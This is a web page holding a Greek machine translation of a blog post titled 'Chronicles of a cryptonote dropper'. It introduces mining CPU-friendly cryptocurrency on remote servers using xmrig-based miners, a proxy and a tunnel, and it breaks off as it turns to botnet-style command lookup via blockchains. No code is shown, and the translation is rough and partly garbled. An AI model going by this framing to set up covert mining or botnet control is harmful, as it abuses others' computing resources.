<!doctypehtml><html prefix="og: https://ogp.me/ns# article: http://ogp.me/ns/article# website: http://ogp.me/ns/website#"lang=el><meta charset=UTF-8><meta content=width=device-width,initial-scale=1 name=viewport><link href=https://www.unto.re/el/posts/chronichles_of_a_cryptonote_dropper/ rel=canonical><link href=https://www.unto.re/de/posts/chronichles_of_a_cryptonote_dropper hreflang=de rel=alternate><link href=https://www.unto.re/it/posts/chronichles_of_a_cryptonote_dropper hreflang=it rel=alternate><link href=https://www.unto.re/zh/posts/chronichles_of_a_cryptonote_dropper hreflang=zh rel=alternate><link href=https://www.unto.re/es/posts/chronichles_of_a_cryptonote_dropper hreflang=es rel=alternate><link href=https://www.unto.re/hi/posts/chronichles_of_a_cryptonote_dropper hreflang=hi rel=alternate><link href=https://www.unto.re/ar/posts/chronichles_of_a_cryptonote_dropper hreflang=ar rel=alternate><link href=https://www.unto.re/pt/posts/chronichles_of_a_cryptonote_dropper hreflang=pt rel=alternate><link href=https://www.unto.re/bn/posts/chronichles_of_a_cryptonote_dropper hreflang=bn rel=alternate><link href=https://www.unto.re/ru/posts/chronichles_of_a_cryptonote_dropper hreflang=ru rel=alternate><link href=https://www.unto.re/ja/posts/chronichles_of_a_cryptonote_dropper hreflang=ja rel=alternate><link href=https://www.unto.re/pa/posts/chronichles_of_a_cryptonote_dropper hreflang=pa rel=alternate><link href=https://www.unto.re/jw/posts/chronichles_of_a_cryptonote_dropper hreflang=jw rel=alternate><link href=https://www.unto.re/vi/posts/chronichles_of_a_cryptonote_dropper hreflang=vi rel=alternate><link href=https://www.unto.re/fr/posts/chronichles_of_a_cryptonote_dropper hreflang=fr rel=alternate><link href=https://www.unto.re/ur/posts/chronichles_of_a_cryptonote_dropper hreflang=ur rel=alternate><link href=https://www.unto.re/tr/posts/chronichles_of_a_cryptonote_dropper hreflang=tr rel=alternate><link href=https://www.unto.re/pl/posts/chronichles_of_a_cryptonote_dropper hreflang=pl rel=alternate><link href=https://www.unto.re/uk/posts/chronichles_of_a_cryptonote_dropper hreflang=uk rel=alternate><link href=https://www.unto.re/nl/posts/chronichles_of_a_cryptonote_dropper hreflang=nl rel=alternate><link href=https://www.unto.re/el/posts/chronichles_of_a_cryptonote_dropper hreflang=el rel=alternate><link href=https://www.unto.re/sv/posts/chronichles_of_a_cryptonote_dropper hreflang=sv rel=alternate><link href=https://www.unto.re/zu/posts/chronichles_of_a_cryptonote_dropper hreflang=zu rel=alternate><link href=https://www.unto.re/ro/posts/chronichles_of_a_cryptonote_dropper hreflang=ro rel=alternate><link href=https://www.unto.re/ms/posts/chronichles_of_a_cryptonote_dropper hreflang=ms rel=alternate><link href=https://www.unto.re/ko/posts/chronichles_of_a_cryptonote_dropper hreflang=ko rel=alternate><link href=https://www.unto.re/th/posts/chronichles_of_a_cryptonote_dropper hreflang=th rel=alternate><link href=https://www.unto.re/tl/posts/chronichles_of_a_cryptonote_dropper hreflang=tl rel=alternate><link title="ιστοσελίδα του untoreh"href=https://www.unto.re/feed.xml rel=alternate type=application/rss+xml><link href=https://www.unto.re/amp/el/posts/chronichles_of_a_cryptonote_dropper/ rel=amphtml><meta content="Chronicles of a cryptonote dropper"property=og:title><meta content=article property=og:type><meta content=https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper property=og:url><meta content=https://www.unto.re/assets/appa.webp property=og:image><meta content="...How far are you willing to go for...pennies?"property=og:description><meta content="untoreh's site"property=og:site_name><meta content=en_US property=og:locale><meta content=summary name=twitter:card><meta content=@untoreh name=twitter:creator><script type=application/ld+json>{"copyrightHolder":"untoreh","@id":"https://www.unto.re","url":"https://www.unto.re","copyrightYear":2022,"@context":"https://schema.org/","image":"/assets/appa.webp","@type":"WebSite"}</script><script id=ldj-webpage type=application/ld+json>{"audience":"cool people","url":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","description":"...How far are you willing to go for...pennies?","author":{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.webp"},"mentions":[],"@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"2021-08-21","dateCreated":"August 21, 2021","@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"2021-08-21","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"creativeWorkStatus":"Published","publisher":{"url":"https://www.unto.re","sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"contactPoint":{"contactType":"info","email":"contact@unto.re","@type":"ContactPoint","telephone":""},"logo":"/assets/appa-60px.png","name":"untoreh's site","@type":"Organization"},"datePublished":"2021-08-21","inLanguage":"English","image":"/assets/appa.webp","name":"","mainEntityOfPage":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","@type":"Article"}}</script><script id=ldj-breadcrumbs type=application/ld+json>{"itemListElement":[{"position":1,"item":"https://www.unto.re","name":"Home","@type":"ListItem"},{"position":2,"item":"/posts/","name":"Posts List","@type":"ListItem"},{"position":3,"item":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper","name":"Chronicles of a cryptonote dropper","@type":"ListItem"}],"@type":"BreadcrumbList"}</script><link href=/libs/highlight/github.min.css rel=stylesheet><style>:root{--block-background:var(--accent2);--small:14px;--normal:19px;--text-color:hsv(0, 0%, 20%)}.franklin-content{position:relative;padding-left:12.5%;padding-right:12.5%;line-height:1.35em}@media (min-width:940px){.franklin-content{width:705px;margin-left:auto;margin-right:auto}}@media (max-width:480px){.franklin-content{padding-left:6%;padding-right:6%}}.franklin-content h2{font-size:22px}h2{text-align:left}.franklin-content h2{padding-bottom:.3em;border-bottom:1px solid #d3d3d3;margin-top:2em;margin-bottom:1em}.franklin-content h2 a{color:inherit}.franklin-content a{color:var(--alt2);text-decoration:none}body{counter-reset:eqnum}code{background-color:var(--block-background);padding:.1em .2em;border-radius:2px;font-size:var(--small);overflow:auto}@media (prefers-color-scheme:light){body{--accent:#3152ff;--accent2:#5a61ae;--accent3:#651b00;--alt:#ae6600;--alt2:#9e6c47;--alt3:#7f4200;--background-color:#ffebee;--foreground-color:#1c0005;--block-background:#423833;--red:#e42a2f;--yellow:#917329;--green:#29892d}}@media (prefers-color-scheme:dark){body{--accent:#72e200;--accent2:#add3a0;--accent3:#7a9eff;--alt:#8abeff;--alt2:#836bd1;--alt3:#a090de;--background-color:#001d49;--foreground-color:#dae2ff;--block-background:#011627;--red:#e42a2f;--yellow:#917329;--green:#29892d}}body{background:var(--background-color);font-style:var(--accent);font-family:Helvetica;padding:0 .5rem;line-height:2rem;color:var(--accent3);max-width:1280px;min-height:720px;margin:auto;min-width:320px}a{color:var(--accent)}a:visited{color:var(--accent2)}.franklin-content{color:var(--foreground-color)}.franklin-content .header-anchor{padding:.5rem!important;line-height:100%}.franklin-content a{outline-style:outset;outline-width:1px;padding:0 .1rem;margin:0 .1rem;outline-color:var(--alt2)}body>div>h1{text-align:center;color:var(--accent2)}body>div #page-description,body>div #title{text-align:center}.masthead__menu{height:4rem;line-height:4rem;padding:10px 0;position:relative}.site-title{float:left;font-weight:700;width:15rem;font-size:1.5rem;text-decoration:none;color:var(--accent)}.site-title:visited{color:var(--accent)}#site-nav{float:right;font-size:1.5rem;font-family:Courier New;font-weight:700;position:absolute;right:0}#site-nav .horiz ul{list-style-type:none;line-height:4rem;height:4rem;margin:0}#site-nav .horiz ul>li{padding:0 .5rem;box-shadow:.25rem -.025rem .05rem var(--alt)}#site-nav .horiz ul>li{float:left;border-top:0;border-bottom:0;border-left:0;border-radius:50% 25% 25% 50%}#site-nav ul>li>a,#site-nav ul>li>button{color:var(--alt);display:inline-block}#site-nav .menu-icons{position:relative;padding:0 .2rem}#site-nav{display:block;width:auto;height:auto}.author__avatar>img{width:4em;height:4em;border-radius:50%;-o-object-fit:cover;object-fit:cover;border-width:.1rem;border-color:var(--accent3);border-style:solid;box-shadow:.1rem .06rem var(--accent3),-.05rem -.025rem .2rem var(--accent3)}#site-nav a:link{text-decoration:none}#site-nav .ham,#site-nav .vert{display:none}.author__avatar{-o-object-fit:contain;object-fit:contain;float:left}.author__wrap>ul{float:left;height:inherit;margin:0;padding:0 10px}.author__wrap>ul>li{position:relative;float:left;list-style-type:none;font-size:1rem;padding:0 .2rem;text-align:center}ul>li.author__urls{font-size:2rem}ul>li.author__urls a:visited{color:var(--accent)}.author__wrap .author__avatar{float:left}.langs-dropdown-content{display:none;text-align:left}.langs-dropdown-content a{display:block}.menu-lang-btn:before{border-radius:25% 25% 25% 50%!important}.lang-link .flag{position:absolute;left:1rem;margin-top:.65rem}#site-nav .langs-dropdown-menu{left:1.5rem;position:relative;top:1rem}#site-nav .langs-dropdown-menu .lang-list{font-size:1rem;line-height:2rem;overflow-x:hidden;height:20rem;position:absolute;overflow-y:scroll;right:1rem;scrollbar-width:thin;border:solid;border-radius:25%;border-width:0 0 0 .25rem;padding-left:3rem}.lang-list{background-color:var(--background-color)}#site-nav ul>li>button{background:inherit;border:inherit;font-size:inherit;font-family:inherit;font-weight:inherit;padding:inherit;margin:inherit;list-style-type:inherit;line-height:inherit;height:inherit}.franklin-content{padding:0 0 2rem;z-index:0}.franklin-content{padding-top:1rem}.lunrSearchForm{margin-right:-.4rem;font-size:0;overflow:hidden}.lunrSearchForm .search-input{background:var(--background-color);color:var(--alt);border-width:.2rem;border:none;outline:0;border-radius:50% 25% 25% 50%;line-height:1.75rem;padding:.5rem 0 .5rem 2.25rem;width:7rem;position:relative;top:.5rem;font-family:Courier New;font-weight:700;font-size:1.5rem}.lunrSearchForm .search-button{color:var(--alt);background:0 0;border:none;font-size:1.5rem;padding:.2rem .2rem .2rem 0;position:absolute;top:1rem;left:.75rem;z-index:1}@media (min-width:680px) and (max-width:1300px){.lunrSearchForm .search-input{font-size:1rem;padding-left:2.75rem;width:4.5rem;border-radius:50% 100% 100% 50%}body{max-width:640px;min-height:320px}#site-nav{position:relative;z-index:1}#site-nav .ham{outline:0}#site-nav .ham,#site-nav .ham-icon{display:block;height:3rem;line-height:3rem;position:absolute;right:0;top:0;text-align:right;background:0 0;border:none;font-size:3rem;color:var(--accent)}#site-nav .horiz{display:none}#site-nav .vert{display:block;float:none;position:absolute;right:0;top:3rem;width:9rem;padding-left:1rem;max-height:0;overflow:hidden;filter:blur(1rem)}#site-nav .vert ul{margin:0;padding:10px 0}#site-nav .vert ul>li{width:100%;text-align:center;border-radius:25% 50% 50% 25%;padding:.5rem 1rem;box-shadow:-.25rem 0 .05rem var(--alt)}}@media (max-width:680px){.lang-link{height:3rem}.lunrSearchForm{display:block;width:28rem}.lunrSearch{position:absolute;top:-4rem;display:block;left:0;width:calc(2rem + 90%)}.lunrSearch .search-input{width:26rem}.masthead,.masthead__menu{display:block}.site-title{float:none;width:100%;display:block;text-align:center}.author__wrap{float:none;display:block;width:100%;height:4.4rem;text-align:center}.author__wrap ul{width:auto;float:none;padding:0;display:inline-block}#site-nav{float:none;padding:10px 0;position:relative;top:4rem}#site-nav ul li{float:none}.horiz{text-align:center}#site-nav ul{display:inline-block;padding:0}.masthead{height:14rem}}.lunrSearchForm{margin-top:1em}@media (max-width:480px){.lunrSearchForm .search-input{width:18rem;left:-4rem}.masthead{height:34rem}#site-nav{top:5rem}#site-nav .horiz ul{width:100%}#site-nav .horiz ul>li{width:calc(100% - 2rem);float:none}}@media (min-width:480px) and (max-width:680px){.masthead{height:20rem}}@media (max-width:680px){body{overflow-x:hidden}#site-nav{z-index:1}#site-nav .horiz ul>li{float:none;top:-4rem;position:relative;margin-top:1rem;margin-bottom:0}}@-webkit-keyframes chars{0%,1.8105942029%{content:"u"}1.8115942029%,3.6221884058%{content:"un"}3.6231884058%,5.4337826087%{content:"unt"}5.4347826087%,7.2453768116%{content:"unto"}7.2463768116%,9.0569710145%{content:"untor"}10.8685652174%,9.0579710145%{content:"untore"}10.8695652174%,12.6801594203%{content:"untoreh"}12.6811594203%,14.4917536232%{content:"untoreh'"}14.4927536232%,16.3033478261%{content:"untoreh's"}16.3043478261%,18.114942029%{content:"untoreh's "}18.115942029%,19.9265362319%{content:"untoreh's s"}19.9275362319%,21.7381304348%{content:"untoreh's si"}21.7391304348%,23.5497246377%{content:"untoreh's sit"}23.5507246377%,to{content:"untoreh's site"}}@keyframes chars{0%,1.8105942029%{content:"u"}1.8115942029%,3.6221884058%{content:"un"}3.6231884058%,5.4337826087%{content:"unt"}5.4347826087%,7.2453768116%{content:"unto"}7.2463768116%,9.0569710145%{content:"untor"}10.8685652174%,9.0579710145%{content:"untore"}10.8695652174%,12.6801594203%{content:"untoreh"}12.6811594203%,14.4917536232%{content:"untoreh'"}14.4927536232%,16.3033478261%{content:"untoreh's"}16.3043478261%,18.114942029%{content:"untoreh's "}18.115942029%,19.9265362319%{content:"untoreh's s"}19.9275362319%,21.7381304348%{content:"untoreh's si"}21.7391304348%,23.5497246377%{content:"untoreh's sit"}23.5507246377%,to{content:"untoreh's site"}}@-webkit-keyframes cursor{75%{border-color:transparent}}@keyframes cursor{75%{border-color:transparent}}.site-title{-webkit-backface-visibility:hidden;backface-visibility:hidden;font-size:1.5rem;font-family:VT323,monospace,sans-serif;color:var(--accent2);-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.site-title:after{content:"​";position:relative;padding-right:.5em;border-right:.5em solid var(--accent);white-space:nowrap;-webkit-animation:5.52s linear 1s forwards chars,1s 3 cursor;animation:5.52s linear 1s forwards chars,1s 3 cursor}.franklin-content a{display:inline-block;vertical-align:middle;text-decoration:none;transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative;overflow:hidden}.franklin-content a:before{content:"";position:absolute;z-index:-1;left:51%;right:51%;bottom:0;background:var(--accent);height:4px}.hvr-outline-in{display:inline-block;vertical-align:middle;transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative}.horiz .hvr-outline-in:before{border-radius:50% 25% 25% 50%;right:-.25rem}.vert .hvr-outline-in:before{border-radius:25% 50% 50% 25%;left:-.25rem}.hvr-outline-in:before{content:"";position:absolute;border:var(--alt) solid .25rem;top:0;bottom:0;left:0;opacity:0}#site-nav .vert:before{background-color:var(--background-color);filter:blur(.25rem);content:"";height:100%;width:100%;position:absolute}.author__avatar{background-color:transparent;perspective:1000px}.masthead__menu ul li.author__avatar img{transform-style:preserve-3d}.flag{display:inline-block;position:relative;width:16px;height:11px;background:url(/assets/flags.png) no-repeat}.flag.flag-th{background-position:-16px -143px}.flag.flag-tr{background-position:-144px -143px}.flag.flag-fr{background-position:-80px -44px}.flag.flag-nl{background-position:-240px -99px}.flag.flag-ms{background-position:-16px -99px}.flag.flag-es{background-position:-224px -33px}.flag.flag-vn{background-position:-128px -154px}.flag.flag-za{background-position:-256px -154px}.flag.flag-ph{background-position:-144px -110px}.flag.flag-ru{background-position:-96px -121px}.flag.flag-pl{background-position:-176px -110px}.flag.flag-gb{background-position:-112px -44px}.flag.flag-ro{background-position:-64px -121px}.flag.flag-pt{background-position:-256px -110px}.flag.flag-in{background-position:-64px -66px}.flag.flag-kr{background-position:-80px -77px}.flag.flag-ua{background-position:-224px -143px}.flag.flag-jp{background-position:-224px -66px}.flag.flag-de{background-position:-32px -33px}.flag.flag-se{background-position:-208px -121px}.flag.flag-gr{background-position:-48px -55px}.flag.flag-id{background-position:-256px -55px}.flag.flag-pk{background-position:-160px -110px}.flag.flag-bd{background-position:-16px -11px}.flag.flag-it{background-position:-144px -66px}.flag.flag-sa{background-position:-128px -121px}.flag.flag-cn{background-position:-176px -22px}</style><link as=style href=/css/bundle.css rel=preload><link href=/css/bundle.css media=print onload=this.onload=null;this.removeAttribute('media'); rel=stylesheet><noscript><link href=/css/bundle.css rel=stylesheet></noscript><link href=/assets/favicon.png rel=icon type=image/x-icon><link href=/assets/favicon.svg rel=icon type=image/svg+xml><title> Χρονικά ενός σταγονόμετρου κρυπτογραφίας</title><meta content="...How far are you willing to go for...pennies?"name=description><script src=/libs/load.js></script><script type=application/ld+json>{"url":"/el/posts/chronichles_of_a_cryptonote_dropper/","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"mentions":null,"description":"","@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"","dateCreated":"","@id":"/el/posts/chronichles_of_a_cryptonote_dropper/","dateModified":"","keywords":[],"creativeWorkStatus":"Published","translator":{"url":"http://google.translate.com","name":"Google Translate","@type":"https://schema.org/Organization"},"translationOfWork":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/"},"datePublished":"2022-11-01T19:29:31.794","inLanguage":"el","name":"","mainEntityOfPage":{"@id":"/el/posts/chronichles_of_a_cryptonote_dropper/","@type":"Article"}}</script><body><div class=masthead><div class=masthead__menu__inner-wrap><div class=masthead__menu><a title="untoreh's site"class=site-title href=/el/></a><div class=author__wrap><script type=application/ld+json>{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.webp"}</script><ul><li class=author__avatar onclick=toggleTheme()><img alt=" ανοικτό φως"class=flip-front src=/assets/appa.webp><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer" title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer" title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script></ul></div><nav id=site-nav><div class=horiz><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><form class=lunrSearchForm name=lunrSearchForm><button title="Αναζήτηση Ιστοτόπου"class=search-button formaction=/search/index.html value=Search><i class="fas fa-search menu-icons"></i></button><input class=search-input name=q placeholder=Search…></form><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/el/posts/><i class="fas fa-pen menu-icons"></i> αναρτήσεις</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/el/media/><i class="fas fa-tv menu-icons"></i> μεσο ΜΑΖΙΚΗΣ ΕΝΗΜΕΡΩΣΗΣ</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn" title="Change website's language"><button title="Languages Menu"class=langs-dropdown-wrapper type=button><i class="fas fa-language menu-icons"></i> Lang <div class="langs-dropdown-content langs-dropdown-menu"><ul class=lang-list><a class="lang-link lang-ar"href=/ar/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-sa"></span>Arabic</a><a class="lang-link lang-bn"href=/bn/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-bd"></span>Bengali</a><a class="lang-link lang-nl"href=/nl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-nl"></span>Dutch</a><a class="lang-link lang-en"href=/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gb"></span>English</a><a class="lang-link lang-tl"href=/tl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ph"></span>Filipino</a><a class="lang-link lang-fr"href=/fr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-fr"></span>French</a><a class="lang-link lang-de"href=/de/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-de"></span>German</a><a class="lang-link lang-el"href=/el/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gr"></span>Greek</a><a class="lang-link lang-hi"href=/hi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Hindi</a><a class="lang-link lang-it"href=/it/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-it"></span>Italian</a><a class="lang-link lang-ja"href=/ja/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-jp"></span>Japanese</a><a class="lang-link lang-jw"href=/jw/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-id"></span>Javanese</a><a class="lang-link lang-ko"href=/ko/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-kr"></span>Korean</a><a class="lang-link lang-ms"href=/ms/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ms"></span>Malay</a><a class="lang-link lang-zh"href=/zh/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-cn"></span>Mandarin Chinese</a><a class="lang-link lang-pl"href=/pl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pl"></span>Polish</a><a class="lang-link lang-pt"href=/pt/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pt"></span>Portuguese</a><a class="lang-link lang-pa"href=/pa/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Punjabi</a><a class="lang-link lang-ro"href=/ro/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ro"></span>Romanian</a><a class="lang-link lang-ru"href=/ru/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ru"></span>Russian</a><a class="lang-link lang-es"href=/es/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-es"></span>Spanish</a><a class="lang-link lang-sv"href=/sv/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-se"></span>Swedish</a><a class="lang-link lang-th"href=/th/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-th"></span>Thai</a><a class="lang-link lang-tr"href=/tr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-tr"></span>Turkish</a><a class="lang-link lang-uk"href=/uk/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ua"></span>Ukranian</a><a class="lang-link lang-ur"href=/ur/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pk"></span>Urdu</a><a class="lang-link lang-vi"href=/vi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-vn"></span>Vietnamese</a><a class="lang-link lang-zu"href=/zu/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-za"></span>Zulu</a></ul></div></button></ul></div><button name="Website Menu"class=ham type=button><i class="fas fa-bars ham-icon"></i></button><div class=vert><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><form class=lunrSearchForm name=lunrSearchForm><button title="Αναζήτηση Ιστοτόπου"class=search-button formaction=/search/index.html value=Search><i class="fas fa-search menu-icons"></i></button><input class=search-input name=q placeholder=Search…></form><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/el/posts/><i class="fas fa-pen menu-icons"></i> αναρτήσεις</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/el/media/><i class="fas fa-tv menu-icons"></i> μεσο ΜΑΖΙΚΗΣ ΕΝΗΜΕΡΩΣΗΣ</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn" title="Change website's language"><button title="Languages Menu"class=langs-dropdown-wrapper type=button><i class="fas fa-language menu-icons"></i> Lang <div class="langs-dropdown-content langs-dropdown-menu"><ul class=lang-list><a class="lang-link lang-ar"href=/ar/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-sa"></span>Arabic</a><a class="lang-link lang-bn"href=/bn/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-bd"></span>Bengali</a><a class="lang-link lang-nl"href=/nl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-nl"></span>Dutch</a><a class="lang-link lang-en"href=/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gb"></span>English</a><a class="lang-link lang-tl"href=/tl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ph"></span>Filipino</a><a class="lang-link lang-fr"href=/fr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-fr"></span>French</a><a class="lang-link lang-de"href=/de/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-de"></span>German</a><a class="lang-link lang-el"href=/el/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gr"></span>Greek</a><a class="lang-link lang-hi"href=/hi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Hindi</a><a class="lang-link lang-it"href=/it/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-it"></span>Italian</a><a class="lang-link lang-ja"href=/ja/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-jp"></span>Japanese</a><a class="lang-link lang-jw"href=/jw/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-id"></span>Javanese</a><a class="lang-link lang-ko"href=/ko/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-kr"></span>Korean</a><a class="lang-link lang-ms"href=/ms/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ms"></span>Malay</a><a class="lang-link lang-zh"href=/zh/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-cn"></span>Mandarin Chinese</a><a class="lang-link lang-pl"href=/pl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pl"></span>Polish</a><a class="lang-link lang-pt"href=/pt/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pt"></span>Portuguese</a><a class="lang-link lang-pa"href=/pa/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Punjabi</a><a class="lang-link lang-ro"href=/ro/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ro"></span>Romanian</a><a class="lang-link lang-ru"href=/ru/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ru"></span>Russian</a><a class="lang-link lang-es"href=/es/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-es"></span>Spanish</a><a class="lang-link lang-sv"href=/sv/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-se"></span>Swedish</a><a class="lang-link lang-th"href=/th/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-th"></span>Thai</a><a class="lang-link lang-tr"href=/tr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-tr"></span>Turkish</a><a class="lang-link lang-uk"href=/uk/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ua"></span>Ukranian</a><a class="lang-link lang-ur"href=/ur/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pk"></span>Urdu</a><a class="lang-link lang-vi"href=/vi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-vn"></span>Vietnamese</a><a class="lang-link lang-zu"href=/zu/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-za"></span>Zulu</a></ul></div></button></ul></div></nav></div></div></div><div><h1 id=title><a href=/el/posts/chronichles_of_a_cryptonote_dropper> Χρονικά ενός σταγονόμετρου κρυπτογραφίας</a></h1><blockquote id=page-description style=font-style:italic>... Πόσο μακριά είσαι διατεθειμένος να φτάσεις για ... πένες;</blockquote></div><div class=franklin-content><p>Ας υποθέσουμε ότι θέλετε να κάνετε δική μου<a href=https://en.wikipedia.org/wiki/Cryptocurrency> κρυπτονομίσματα</a> στο τηλεχειριστήριο<em> εικονικός</em> σκεύη, εξαρτήματα. Πρέπει να βρεις κάτι για το δικό μου. Απομακρυσμένοι διακομιστές σημαίνει, όχι<a href=https://en.wikipedia.org/wiki/Application-specific_integrated_circuit> ASICS</a> ή απόδειξη GPU αλγορίθμων εργασίας, βασικά μόνο<a href=\posts/a-few-notes-on-proof-of-work> Φιλικά νομίσματα CPU</a>.<h2 id=the_software><a class=header-anchor href=#the_software> Το λογισμικό</a></h2><p>Searchάξτε και βρείτε ένα<a href=https://github.com/xmrig/xmrig> μεταλλωρύχος</a> , αλλά δεν είναι πραγματικά ωραίο, θα θέλατε κάτι που μπορείτε να ελέγξετε καλύτερα από το τηλεχειριστήριο, ώστε να το βρείτε<a href=https://github.com/Bendr0id/xmrigCC> άλλος ανθρακωρύχος</a> Το Θέλετε επίσης ένα<a href=https://github.com/Bendr0id/xmrigcc-proxy> πληρεξούσιο</a> , επειδή πολλές συνδέσεις θα είναι βραχύβιες, δεν θέλετε<a href=https://en.wikipedia.org/wiki/Denial-of-service_attack> dos</a> την πισίνα εξόρυξης σας. Επίσης α<a href=https://github.com/search?q=tunnel> σήραγγα</a> Θα ήταν ωραίο.<h2 id=the_design><a class=header-anchor href=#the_design> Ο σχεδιασμός</a></h2><p>Ορισμένα botnets χρησιμοποιούν δεδομένα blockchains για την αναζήτηση εντολών,<a href=https://twitter.com/sarahjamielewis> κάποιος</a> 